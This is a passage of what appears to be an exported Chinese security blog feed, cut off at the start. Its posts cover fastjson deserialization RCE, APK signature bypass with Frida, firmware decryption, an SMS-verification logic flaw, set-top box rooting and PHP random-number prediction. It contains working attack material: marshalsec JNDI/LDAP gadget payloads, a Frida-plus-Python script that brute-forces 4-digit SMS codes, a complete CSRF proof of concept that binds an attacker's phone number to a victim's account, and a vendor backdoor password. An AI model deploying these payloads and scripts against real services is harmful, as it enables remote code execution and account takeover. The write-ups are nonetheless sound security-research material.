sortedFieldDeserializers.length) &#123; fieldDeser = sortedFieldDeserializers[fieldIndex]; fieldInfo = fieldDeser.fieldInfo; fieldClass = fieldInfo.fieldClass; feildAnnotation = fieldInfo.getAnnotation(); &#125; ... if (fieldDeser != null) &#123; ... else if (lexer.matchStat == JSONLexer.NOT_MATCH_NAME) &#123; continue; &#125; &#125; if (!matchField) &#123; key = lexer.scanSymbol(parser.symbolTable); ... &#125; if (matchField) &#123; ... &#125; else &#123; boolean match = parseField(parser, key, object, type, fieldValues); ... 在parseField中，选择合适的反序列化的方法，最终在setValue里调用类的setter方法。123456//./src/main/java/com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java:public void setValue(Object object, Object value)if (fieldInfo.getOnly) &#123; ...&#125; else &#123; method.invoke(object, value);&#125; fastjson 的执行逻辑以及利用思路简单而言，fastjson 会从客户端接收一段json数据，并解析成为一个类的实例。fastjson 有个叫做@type的特殊的key，可以指定当前json数据被反序列化为哪个类。这个类不能在内置的黑名单里。类里不止有public类型的成员变量，还会有private的。对public类型的成员变量，可以直接为它赋值。对private的，需要调用对应的setter方法才能访问到这些变量，除非启用SupportNonPublicField这个特性。 利用的思路为，找到java里一些可以访问到的类，查看里面的一些setter方法除了设置变量之外还做了什么其他的可能造成危险的操作，通过反序列化这个类并填充数据，最终调用危险的setter方法，完成利用。 对于fastjson来说，只要调用了JSON.parse(text1);或者JSON.parseObject(text1, Object.class);即有可能出现问题，而不一定需要设置SupportNonPublicField，这个看具体的利用思路。 当然，除了这种可能造成rce的利用方式，还可以在知道源码的情况下或者猜测成员变量设置一些原始请求中没有的属性。如注册用户时的admin属性等。 fastjson rce的利用Ricter大佬直接丢过来一个讲java反序列化的github地址，说思路同jackson。在这个github里有人整理了一些可以利用的java类并给出了对应的poc。有直接执行bytecode的，也有JNDI的。 下载编译好之后java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.Jackson -a exploit.exec=&quot;calc&quot;即可生成用于jackson的payload。 1234567[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",&#123;\"targetBeanName\":\"ldap://localhost:1389/obj\",\"propertyPath\":\"foo\",\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",&#123;\"shareableResources\":[\"ldap://localhost:1389/obj\"]&#125;]&#125;][\"java.util.HashSet\",[[\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",&#123;\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",&#123;\"shareableResources\":[\"ldap://localhost:1389/obj\"]&#125;],\"adviceBeanName\":\"ldap://localhost:1389/obj\"&#125;],[\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",&#123;&#125;]]][\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",&#123;\"userOverridesAsString\":\"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;\"&#125;][\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",&#123;\"jndiName\":\"ldap://localhost:1389/obj\",\"loginTimeout\":0&#125;] Ricter大佬在微博上发的利用com.sun.rowset.JdbcRowSetImpl这个类的方法可以在github里附带的一个pdf里找到。跟到这个类里去，发现在setAutoCommit的时候会调用this.connect()，在connect()里能加载远程的方法执行。 12345678910111213141516171819202122232425//com.sun.rowset.JdbcRowSetImplpublic void setAutoCommit(boolean var1) throws SQLException &#123; if (this.conn != null) &#123; this.conn.setAutoCommit(var1); &#125; else &#123; this.conn = this.connect(); this.conn.setAutoCommit(var1); &#125;&#125;private Connection connect() throws SQLException &#123; if (this.conn != null) &#123; return this.conn; &#125; else if (this.getDataSourceName() != null) &#123; try &#123; InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); return this.getUsername() != null &amp;&amp; !this.getUsername().equals(\"\") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection(); &#125; catch (NamingException var3) &#123; throw new SQLException(this.resBundle.handleGetObject(\"jdbcrowsetimpl.connect\").toString()); &#125; &#125; else &#123; return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null; &#125;&#125; 在利用的时候，开启rmi服务，发现会有请求过来，但是死活利用不成功。最后Tomato大佬给出问题的原因和解决方案，把服务器的hostname设置成外网ip就行了。 另外ph大佬在微博上提到 java 8u121 增加了trustURLCodebase选项，默认打不了了。虽然有些利用方法可能在将来失效，但是一些漏洞产生原理还是值得学习的。 最后感谢雨神带我日站，感谢Ricter大佬在微博上发fastjson的exp指点我用marshalsec，感谢Tomato大佬指明rmi服务器无法连接成功的原因。 这几天发现大佬们又开始讨论fastjson的利用问题，那个站大概就是起因吧。:P 参考资料https://ricterz.me/posts/Fastjson%20Unserialize%20Vulnerability%20Write%20Uphttp://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review.htmlhttps://github.com/mbechler/marshalsec","categories":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}],"tags":[],"keywords":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}]},{"title":"记一次apk检测","slug":"记一次apk检测","date":"2017-09-03T16:00:00.000Z","updated":"2019-08-16T04:24:28.788Z","comments":true,"path":"2017/09/记一次apk检测/","link":"","permalink":"http://5alt.me/2017/09/记一次apk检测/","excerpt":"之前在日一个APP。去官网下apk回来，手机运行，发现走的https协议，请求带有一个签名参数，修改请求会导致签名不对无法通过验证。签名是40位的，看起来像是sha1。上Inspeckage，在log里也没发现与请求相关的hash函数。 拖到jeb里，发现加壳了。粗略看了下应该是梆梆的壳，渣渣如我根本不会脱壳。找大佬帮忙脱壳，却发现签名算法是放在native里的。。硬着头皮把so拖到ida里，却发现整个so的结构非常奇怪，没有JNI_OnLoad，导出表里的函数对应位置也不对。应该还是壳的问题，把so也加固了。adb shell到手机上，发现有好几个此apk的进程，从其中一个进程里的maps里找到加载这个so的地址，想直接dd出来，却发现一但dd进程就会退掉。。尝试挂上ida远程调试，却发现无论如何也attach不上这个进程，猜测可能是被它的父进程ptrace了 = = 杀掉父进程这个子进程也就退出了。。然后尝试直接hook脱壳后java里的一些方法，也不能hook到。想直接调用so，由于连JNI_OnLoad都没有，看起来也不像能直接调用的样子。作为一个web狗碰到这些，在心里不知道念了多少次mdzz了。。","text":"之前在日一个APP。去官网下apk回来，手机运行，发现走的https协议，请求带有一个签名参数，修改请求会导致签名不对无法通过验证。签名是40位的，看起来像是sha1。上Inspeckage，在log里也没发现与请求相关的hash函数。 拖到jeb里，发现加壳了。粗略看了下应该是梆梆的壳，渣渣如我根本不会脱壳。找大佬帮忙脱壳，却发现签名算法是放在native里的。。硬着头皮把so拖到ida里，却发现整个so的结构非常奇怪，没有JNI_OnLoad，导出表里的函数对应位置也不对。应该还是壳的问题，把so也加固了。adb shell到手机上，发现有好几个此apk的进程，从其中一个进程里的maps里找到加载这个so的地址，想直接dd出来，却发现一但dd进程就会退掉。。尝试挂上ida远程调试，却发现无论如何也attach不上这个进程，猜测可能是被它的父进程ptrace了 = = 杀掉父进程这个子进程也就退出了。。然后尝试直接hook脱壳后java里的一些方法，也不能hook到。想直接调用so，由于连JNI_OnLoad都没有，看起来也不像能直接调用的样子。作为一个web狗碰到这些，在心里不知道念了多少次mdzz了。。总而言之，加密算法在so里，java里有一个封装的调用入口。要么逆so，要么想办法hook到java里的方法。现在来看，两种都不能实现。 面对这种艰难的情况，接下来的思路其实还有两个。要么搞iOS上ipa，ipa基本上是没有加壳的，只不过逆向起来非常恶心。找了台越狱的iPhone，砸壳后拖到hopper里，签名的函数倒是很好找，至于逆向算法，已经远远超出我的能力范围了。。用frida来hook，一些参数死活打不出来。。要么找老版本apk，老版本可能还没有被加壳。搜啊搜，还真搜到了一个没加壳并且还能用的老版apk。没加壳的版本就可以愉快的hook了。 这个apk走https的流量无法被burpsuite抓到，应该是自带了证书。可以选择重打包apk替换掉里面的证书，或者强行把https的url改成http的。我在搞的时候用了一个叫ssl_logger的小脚本来辅助抓取https的请求和响应。 这是基于frida的一个hook脚本，需要手机上运行frida-server，并且需要电脑上frida版本与frida-server版本一致。 接下来就是继续用frida来hook签名函数，实现给自己的请求签名。 第一个测试目标是检测手机验证码是否能进行爆破。编写脚本。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import fridaimport sysfrom urllib import quoteimport requestsbody = ''def data2body(data): p = data.strip('&#123;').strip('&#125;').split(', ') body = '' for i in p: t = i.split('=', 1) body += t[0] + '=' + quote(t[1]) + '&amp;' return bodydef on_message(message, data): global body try: if message: if 'captcha' in message[\"payload\"]: body = data2body(message[\"payload\"]) else: body += 'si=%s'%message[\"payload\"] url = 'https://5alt.me/checkcode' headers = &#123;'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'&#125; #r = requests.post(url, body, headers=headers).text print body print r if not '\"errcode\":769' in r: print '-'*20 print body print r print '-'*20 #print(\"[*] Received data: &#123;0&#125;\".format(message[\"payload\"])) except Exception as e: print(message) print(e)def run_frida_script(): frida_script_code = \"\"\"function genAllNumber(start, end)&#123; var output = [], n, padded; for (n=start; n&lt;=end; n++) &#123; padded = ('000'+n).slice(-4); // Prefix three zeros, and get the last 4 chars output.push(padded); &#125; return output;&#125;Java.perform(function () &#123; // Function to hook is defined here var sig = Java.use('me.5alt.signature.a'); sig.b.overload(\"java.util.Map\", \"java.lang.String\", \"boolean\").implementation = function (a, b, c) &#123; output = genAllNumber(0, 9999) for(i in output)&#123; a.put('captcha', output[i]) var timestamp = Date.parse(new Date()); timestamp = parseInt(timestamp / 1000); a.put('tm', String(timestamp)) send(a.toString()) retval = this.b(a,b,c); send(retval) &#125; return retval; &#125;;&#125;); \"\"\" print \"[*] Executing following code:\\n\" + frida_script_code return frida_script_codeif __name__ == '__main__': session = frida.get_usb_device().attach(\"me.5alt\") script = session.create_script(run_frida_script()) script.on('message', on_message) script.load() sys.stdin.read() 脚本非常简单粗暴，生成0000到9999的验证码，调用java的函数产生签名，然后发送出来交给python发请求探测。服务器会检查timestamp，因此需要重新生成。手机上点一下提交即可触发。 这样用起来还不是很直观，总不能每发请求都得去手机上点一下。这时候想起来Brida，可以把frida和burpsuite结合起来，在burpsuite里直接调用apk里的函数进行签名。 Brida的用法就不啰嗦了，已经有详细的教程了。需要说明的是，必须得在Brida里开启server，并且spawn application，否则无法调用。本地修改完js之后记得reload一下，即刻生效。Brida里有个Execute Method，可以调用js里面定义的函数。这里执行和右键菜单中的Brida Custom 1的参数是不一样的。Brida Custom 1获取的参数是hex形式的，需要先解码才能用，同样，Brida Custom 1的返回需要先hex编码之后再return。 在写js的时候遇到了一些坑。。js里的unescape/decodeURIComponent/decodeURI函数都不能把+解码成空格，我选择了手动替换的方式。另外在js里调用java里的类相当于用反射的方式来操作，Map这个类我死活实例化不出来，于是只能找了个返回Map类型的方法调用一下来获得一个Map对象。 最后附上Brida用的脚本。 参考资料https://www.frida.re/docs/android/http://bobao.360.cn/learning/detail/4209.htmlhttp://www.ninoishere.com/frida-learn-by-example/https://github.com/antojoseph/frida-android-hookshttps://11x256.github.io/https://github.com/5alt/ssl_logger","categories":[{"name":"Android","slug":"Android","permalink":"http://5alt.me/categories/Android/"}],"tags":[],"keywords":[{"name":"Android","slug":"Android","permalink":"http://5alt.me/categories/Android/"}]},{"title":"某智能设备固件解密","slug":"某智能设备固件解密","date":"2017-08-12T16:00:00.000Z","updated":"2019-08-16T04:24:28.787Z","comments":true,"path":"2017/08/某智能设备固件解密/","link":"","permalink":"http://5alt.me/2017/08/某智能设备固件解密/","excerpt":"获取固件拿到硬件设备的第一个想法就是获取固件。通常来说获取固件有三种方式：从设备官方网址下载，抓包固件升级过程，从设备固件存储器中获取。 此设备的官网提供在线升级的功能，升级过程需要读取硬件的一些基本信息，而此设备恰好不被支持。抄起工具把网站日了下来，却发现网站上只提供其他型号的升级包，而且是加过密的。于是只能从现有的设备入手了。 观察电路板，发现板子上主控芯片为ATMEL SAMA5D2系列的芯片，无明显的UART和JTAG接口，存在SOP8封装的型号为N25Q032A的Flash芯片。所以固件只能从Flash里读取出来了。 从Flash里读固件第一步是把芯片从板子上焊下来，对于SOP8封装的芯片建议用电风枪吹下来，血泪教训告诉我们，用电烙铁非常容易把芯片弄坏。 把Flash芯片焊下来之后就是从芯片里读取固件内容了。这里推荐用编程器来读，淘宝一两百人民币就能买到。我们也尝试过用FlashROM来读，但是有时候会很不稳定，对于有的型号并不能完整的将Flash读出来。","text":"获取固件拿到硬件设备的第一个想法就是获取固件。通常来说获取固件有三种方式：从设备官方网址下载，抓包固件升级过程，从设备固件存储器中获取。 此设备的官网提供在线升级的功能，升级过程需要读取硬件的一些基本信息，而此设备恰好不被支持。抄起工具把网站日了下来，却发现网站上只提供其他型号的升级包，而且是加过密的。于是只能从现有的设备入手了。 观察电路板，发现板子上主控芯片为ATMEL SAMA5D2系列的芯片，无明显的UART和JTAG接口，存在SOP8封装的型号为N25Q032A的Flash芯片。所以固件只能从Flash里读取出来了。 从Flash里读固件第一步是把芯片从板子上焊下来，对于SOP8封装的芯片建议用电风枪吹下来，血泪教训告诉我们，用电烙铁非常容易把芯片弄坏。 把Flash芯片焊下来之后就是从芯片里读取固件内容了。这里推荐用编程器来读，淘宝一两百人民币就能买到。我们也尝试过用FlashROM来读，但是有时候会很不稳定，对于有的型号并不能完整的将Flash读出来。 固件查看用 010editor 查看固件，观察固件发现在固件的0x20000偏移处有F1 F2 F3 F4 CD CD CD CD CD CD CD CD 10 BB 00 00开头的疑似加密之后的数据。猜测该部分为加密部分的头，0xBB10为加密部分的长度。同样的结构在0x70000也有。 即固件0x0开始为设备的启动代码，0x20000开始为一段加密数据，0x70000开始为另一段加密数据。 加密数据前16个byte为加密块的头。头结构为12340xf4f3f2f10xcdcdcdcd0xcdcdcdcddata_length 通过主控芯片的手册可知，芯片采用的是ARMv7-A的架构。ARM 是 RISC 指令集，在32位模式下一般为ARM指令集，指令长度固定，默认为小端模式。 将固件载入IDA，选择 ARM Little-endian 的处理器，可以看到程序的汇编代码。我们推测在启动代码里存在解密加密数据的算法和密钥。 ARM代码最开始部分为中断向量表。常见的入口代码如下所示。 12345678910111213.globl _start_start: b reset ldr pc, _undefined_instruction ldr pc, _software_interrupt ldr pc, _prefetch_abort ldr pc, _data_abort ldr pc, _not_used ldr pc, _irq ldr pc, _fiq..._irq: .word irq 这样当reset的时候，PC会被设置为base+0，遇到undefined_instruction的时候会将PC设置为base+4。reset指向的函数地址为初始化代码以及程序逻辑真正的入口。 从IDA里可以看到，该固件开始部分汇编代码符合入口的特征。 寻找固件基址对于这种没有底层操作系统的固件来说，第一步要找到基址，这是二进制文件加载到内存后在内存的地址。如果不调整基址，代码中有些绝对地址寻址的指令，寻找数据的时候可能对应不上。 一种方法是根据代码中的load指令寻找载入立即数的操作，来猜测基址。在ARM中，大部分的load指令为相对寻址，载入相对于当前PC某个偏移处的内存内容，这个内容往往是一个绝对的在固件运行时的地址（即加上了基址之后的地址）。而在ida里，对于这种情况进行了显示上的处理，会直接显示将这个绝对的地址加载到寄存器里。可以根据load指令加载的地址猜测出一个基址来，如果一些内存能成功的找到xref，即说明基址找的是正确的。一个自动化寻找基址的方案是，用strings找出字符串在文件中的偏移，在ida里找出所有load指令加载的地址，爆破基址，当字符串的偏移加上基址能在load指令加载的地址里找的时，这个基址有很大可能为正确的基址。 另外，对于一个嵌入式设备来讲，一般会将ROM加载到内存中然后执行。查看芯片的手册，手册中的内存设备地址一般为基址。如果外部flash存放的代码是一个bootloader，那么逆向可以获得下一步程序加载的基址。（一般用于固件解密后跳转到真正的代码执行） 对于其他情况，如果固件能通过binwalk识别出u-boot image，在信息里会输出基址，因为在u-boot image的文件头中存有基址信息。 在这里，我们找到固件的基址为0x200000。 固件逆向由于固件有部分数据是加密过的，在运行的时候一定会存在解密操作。用IDA的Find Crypt插件寻找常用密码学算法的常量，发现代码中存在sha256和sha512算法。同时在芯片的手册中发现有硬件AES模块，在此CPU中，AES硬件模块的基址为0xF002C000。在IDA中寻找该立即数即可找到固件中调用硬件AES的代码，根据手册中对应位置内存的功能对代码中函的进行标记。对于这些特殊的地址，在逆向过程中边查手册边将其功能标记出来。 我们发现，与AES相关的函数地址以及sha256的地址被存放在了内存中的某个区域，在一段疑似对数据块解密的函数中进行了调用。此函数先判断了数据块是否以0xf4f3f2f1开头，并检查其长度是否小于0x30000并且是否为0x40的倍数。然后就是获取芯片的序列号并做sha256作为key1，然后把序列号进行byte交换，sha256后作为key2，设置IV为\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x20\\x00\\x00\\x00，对前一半的数据用key1解，后一半的数据用key2解。解完之后得到真正的逻辑代码。 按照这个逻辑看来，固件的解密需要获取芯片的序列号，每个芯片的系列号都不相同，所以每个板子中的固件也都不一样。问题来了，我们怎么才能拿到芯片的序列号呢？ 解密固件为了解密固件，我们需要拿到芯片的序列号作为AES的key。网上搜了一会也没搜到有用的信息。由于板子上也没有可以连接电脑输出的接口，即使读到了也很难将其输出出来。难道要从板子上找个灯，将读到的序列号通过控制灯的亮灭一位一位的输出出来吗。。 该设备可以将配置的修改保存下来，那么就一定有写回 flash 的方法。我们可以把序列号读出来之后再写回 flash，这样再读一次flash就能得到序列号了。FLash芯片在写之前需要先erase。因为Flash的write只能使bit从1变成0，而Flash erase会把所有的bit设置为1。 修改固件代码，把读取序列号并写回flash的shellcode填入，焊回flash芯片上电运行一段时间，取下flash，读取出里面的序列号即可解密固件。由于芯片的序列号是有规律的，我们可以通过暴力序列号的一部分来解密其他设备的固件。 在固件里也发现了一个固定的AES密钥，猜测是用来解密升级固件的，尝试用来解密官网上的其他型号的固件升级包失败。 最后对于智能设备的固件，厂商很难保证固件不被攻击者拿到。对固件的加密只能增加攻击者获取固件的难度。对于小型的设备最好的方法是把固件保存在主控芯片内的rom中，或者将核心的解密逻辑放在主控芯片内，这样攻击者很难获取到主控芯片内的flash中存储的数据，使固件不能被以较低成本获取。 在逆向的过程中，由于固件的代码没有外部函数的调用，可以用模拟器来模拟执行一些代码段辅助逆向。emu是基于unicorn的一个模拟执行辅助脚本，根据idaemu修改而来，欢迎一起共同维护。 感谢hyperchem大佬带我飞！ 参考资料https://reverseengineering.stackexchange.com/questions/13948/how-to-find-bootloader-load-addresshttp://stackoverflow.com/questions/21312963/arm-bootloader-interrupt-vector-table-understandinghttps://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/https://github.com/5alt/emu","categories":[{"name":"逆向","slug":"逆向","permalink":"http://5alt.me/categories/逆向/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"http://5alt.me/categories/逆向/"}]},{"title":"SESSION 中的手机验证码","slug":"SESSION中的手机验证码","date":"2017-07-13T16:00:00.000Z","updated":"2019-08-16T04:24:28.784Z","comments":true,"path":"2017/07/SESSION中的手机验证码/","link":"","permalink":"http://5alt.me/2017/07/SESSION中的手机验证码/","excerpt":"之前在检测某网站的时候发现了一个好玩的逻辑问题，可以在更换手机号的时候，可以不用原手机的验证码解绑,只需要新手机接收验证码就能绑定手机。 漏洞的成因是新旧手机的验证码在 session 中用同一个变量名存储，更换手机号的时候运行越过前面几步直接向新手机发送短信验证码。此时新手机的短信验证码就被当成了第一步解绑老手机时发往老手机的验证码，导致攻击者可以直接用自己的手机绑定到受害者的账号上。","text":"之前在检测某网站的时候发现了一个好玩的逻辑问题，可以在更换手机号的时候，可以不用原手机的验证码解绑,只需要新手机接收验证码就能绑定手机。 漏洞的成因是新旧手机的验证码在 session 中用同一个变量名存储，更换手机号的时候运行越过前面几步直接向新手机发送短信验证码。此时新手机的短信验证码就被当成了第一步解绑老手机时发往老手机的验证码，导致攻击者可以直接用自己的手机绑定到受害者的账号上。首先发送给新手机号发送验证码的请求: 1234POST /user/send_new_mobile_sms HTTP/1.1...mobile=新手机号 在新手机号接收到验证码之后发送请求: 1234POST /user/verify_mobile_sms HTTP/1.1...smscode1=新手机号验证码 最后绑定新手机号: 1234POST /user/verify_new_mobile_sms HTTP/1.1...smscode2=新手机号验证码 此逻辑漏洞配合 CSRF 漏洞可以实现以下攻击场景:在用户登录网站的情况下，只要访问攻击者的一个页面，攻击者就能把自己的手机号绑定到用户的账号上，进而控制用户的账号。 最后附上POC：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104&lt;div id='poc' width=0 height=0&gt;&lt;/div&gt;&lt;script&gt;function get(url)&#123; httpRequest = new XMLHttpRequest(); httpRequest.open('GET', url, false); httpRequest.send(); if (httpRequest.status === 200) &#123; return httpRequest.responseText; &#125;&#125;function post(url, key, value)&#123; data='&lt;body&gt;&lt;form id=\"f1\" action=\"'+url+'\" method=\"POST\"&gt; \\ &lt;input name=\"'+key+'\" type=\"text\" value=\"'+value+'\" /&gt; \\ &lt;/form&gt; \\ &lt;script&gt; \\ f1.submit(function()&#123;return false&#125;) \\ &lt;\\/script&gt;&lt;/body&gt;' f=document.createElement('iframe') f.src=\"data:text/html;base64,\"+btoa(data) f.height=0 f.width=0 poc.append(f)&#125;function getcode()&#123; url = 'http://127.0.0.1/1.php' data = get(url) if(data.length &gt; 0)&#123; clearInterval(sh) exploit(data) &#125;&#125;function exploit(code)&#123; url = \"https://www.xxx.com/user/verify_mobile_sms\" //post(url, \"smscode1\", code) setTimeout(post, 0, url, \"smscode1\", code) url = \"https://www.xxx.com/user/verify_new_mobile_sms\" //post(url, \"smscode2\", code) setTimeout(post, 3000, url, \"smscode2\", code) setTimeout(alert, 4000, 'mobile changed!')&#125;post(\"https://www.xxx.com/user/send_new_mobile_sms\", 'mobile', '18888888888')code = ''sh=setInterval(getcode,1000);&lt;/script&gt;&lt;div id='poc' width=0 height=0&gt;&lt;/div&gt;&lt;script&gt;function get(url)&#123; httpRequest = new XMLHttpRequest(); httpRequest.open('GET', url, false); httpRequest.send(); if (httpRequest.status === 200) &#123; return httpRequest.responseText; &#125;&#125;function post(url, key, value)&#123; data='&lt;body&gt;&lt;form id=\"f1\" action=\"'+url+'\" method=\"POST\"&gt; \\ &lt;input name=\"'+key+'\" type=\"text\" value=\"'+value+'\" /&gt; \\ &lt;/form&gt; \\ &lt;script&gt; \\ f1.submit(function()&#123;return false&#125;) \\ &lt;\\/script&gt;&lt;/body&gt;' f=document.createElement('iframe') f.src=\"data:text/html;base64,\"+btoa(data) f.height=0 f.width=0 poc.append(f)&#125;function getcode()&#123; url = 'http://127.0.0.1/1.php' data = get(url) if(data.length &gt; 0)&#123; clearInterval(sh) exploit(data) &#125;&#125;function exploit(code)&#123; url = \"https://www.jxxx.com/user/verify_mobile_sms\" //post(url, \"smscode1\", code) setTimeout(post, 0, url, \"smscode1\", code) url = \"https://www.xxx.com/user/verify_new_mobile_sms\" //post(url, \"smscode2\", code) setTimeout(post, 3000, url, \"smscode2\", code) setTimeout(alert, 4000, 'mobile changed!')&#125;post(\"https://www.xxx.com/user/send_new_mobile_sms\", 'mobile', '18888888888')code = ''sh=setInterval(getcode,1000);&lt;/script&gt;","categories":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}],"tags":[],"keywords":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}]},{"title":"关于联通机顶盒","slug":"关于联通机顶盒","date":"2017-06-13T16:00:00.000Z","updated":"2019-08-16T04:24:28.786Z","comments":true,"path":"2017/06/关于联通机顶盒/","link":"","permalink":"http://5alt.me/2017/06/关于联通机顶盒/","excerpt":"装联通宽带送了个机顶盒，没啥用，只能看一些收费的节目。看起来是个安卓的盒子，那就搞一搞吧。 ZTE机顶盒第一次送的机顶盒是中兴的，有个现成的工具可以开启adb，直接搞定。 工具下载 顺便提取出来的还有一些奇怪的网站，可以下到所有版本的固件，附后。","text":"装联通宽带送了个机顶盒，没啥用，只能看一些收费的节目。看起来是个安卓的盒子，那就搞一搞吧。 ZTE机顶盒第一次送的机顶盒是中兴的，有个现成的工具可以开启adb，直接搞定。 工具下载 顺便提取出来的还有一些奇怪的网站，可以下到所有版本的固件，附后。 数码视讯Q5这个盒子有三种方法破解。 拆机ttl拆机，在主板上很容易就能看到有串口，波特率是115200，数据位8，奇偶校验无，停止位1，流控制无，连接上就能获得一个root shell。 路由器iptables机顶盒安装页面中推广的apk的时候走的是http协议，可以简单劫持，替换apk。 后门密码在设置中有个高级设置，后门密码是82345862，可以发现开启adb的隐藏选项。 其他如果将盒子重置了，在进入系统的时候会卡在 90% 身份验证的地方，这时候装个沙发桌面就能直接绕过这个登陆了。（真像是在打广告） 一些链接启动页广告信息： http://210.13.0.175:7083/launcher/xml/1495680551/launcher_1080p.xml 参考资料http://www.znds.com/tv-695278-1-1.html","categories":[{"name":"fun","slug":"fun","permalink":"http://5alt.me/categories/fun/"}],"tags":[],"keywords":[{"name":"fun","slug":"fun","permalink":"http://5alt.me/categories/fun/"}]},{"title":"php里的随机数","slug":"php里的随机数","date":"2017-06-11T16:00:00.000Z","updated":"2019-08-16T04:24:28.785Z","comments":true,"path":"2017/06/php里的随机数/","link":"","permalink":"http://5alt.me/2017/06/php里的随机数/","excerpt":"这次来填一个关于php随机数预测的坑。php5和php7中的随机数产生机制已经大有不同，本文将详细讲一讲这些区别和爆破种子的时候会产生的问题。 php中常用的随机数产生函数是rand()和mt_rand()。下面将针对这两个函数展开。","text":"这次来填一个关于php随机数预测的坑。php5和php7中的随机数产生机制已经大有不同，本文将详细讲一讲这些区别和爆破种子的时候会产生的问题。 php中常用的随机数产生函数是rand()和mt_rand()。下面将针对这两个函数展开。 php5 中的随机数randphp5 中的rand函数调用的是glibc中的random()。其实现算法可以简化为如下代码。 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#define MAX 1000#define seed 1int main() &#123; int r[MAX]; int i; r[0] = seed; for (i=1; i&lt;31; i++) &#123; r[i] = (16807LL * r[i-1]) % 2147483647; if (r[i] &lt; 0) &#123; r[i] += 2147483647; &#125; &#125; for (i=31; i&lt;34; i++) &#123; r[i] = r[i-31]; &#125; for (i=34; i&lt;344; i++) &#123; r[i] = r[i-31] + r[i-3]; &#125; for (i=344; i&lt;MAX; i++) &#123; r[i] = r[i-31] + r[i-3]; printf(\"%d\\n\", ((unsigned int)r[i]) &gt;&gt; 1); &#125; return 0;&#125; 我们可以看到，当前的随机数与之前第31个和之前第3个有关。因此只要获取了连续31个随机数，就有极大概率（输出的时候左移导致部分信息丢失）预测后面的随机数。 mt_randphp5的mt_rand函数实现的是一个错误版本的MT19937随机数生成算法。在twist函数中有个地方把变量弄错了 =。 = 对php5的mt_rand的攻击就是根据几个随机数序列来爆破种子，然后推测出整个随机数的序列。工具是openwall的php_mt_seed。 值得一提的是，mt_rand可以指定随机数产生的范围int mt_rand ( int $min , int $max )。此时产生随机数的方式是用一个宏来处理。 12345678#define RAND_RANGE(__n, __min, __max, __tmax) \\ (__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))...number = (long) (php_mt_rand(TSRMLS_C) &gt;&gt; 1);if (argc == 2) &#123; RAND_RANGE(number, min, max, PHP_MT_RAND_MAX);&#125;RETURN_LONG(number); 即用内置函数php_mt_rand产生的随机数进行乘除操作，得到位于合适范围的值。需要注意的是，无论mt_rand函数的调用带不带范围，其输出的结果与php_mt_rand(TSRMLS_C) &gt;&gt; 1有关。通过mt_rand()可以直接计算出mt_rand(min, max)来。 php7 中的随机数randphp7中的rand函数同mt_rand，srand同mt_srand。 mt_rand从 php 7.1.0 开始，mt_rand函数修复了之前对MT19937实现上的错误，但是仍然保留了错误版本的随机数生成方式。详情见mt_srand的文档。 MT_RAND_MT19937 Uses the fixed, correct, Mersenne Twister implementation, available as of PHP 7.1.0. MT_RAND_PHP Uses an incorrect Mersenne Twister implementation which was used as the default up till PHP 7.1.0. This mode is available for backward compatibility. 除了修复twist函数的问题之外，在产生一个范围的随机数的时候，php7和php5的行为也不一致。 12345678910111213141516if (argc == 0) &#123; // genrand_int31 in mt19937ar.c performs a right shift RETURN_LONG(php_mt_rand() &gt;&gt; 1);&#125;...RETURN_LONG(php_mt_rand_common(min, max));...if (BG(mt_rand_mode) == MT_RAND_MT19937) &#123; return php_mt_rand_range(min, max);&#125;...umax++;...result = php_mt_rand();...return (zend_long)((result % umax) + min); 根据代码我们可以看到，mt_rand函数不带范围的时候，输出的结果为php_mt_rand() &gt;&gt; 1；而带范围的时候，输出的结果为(php_mt_rand() % (max-min+1)) + min。通过mt_rand()不可以直接计算出mt_rand(min, max)，存在一些误差。 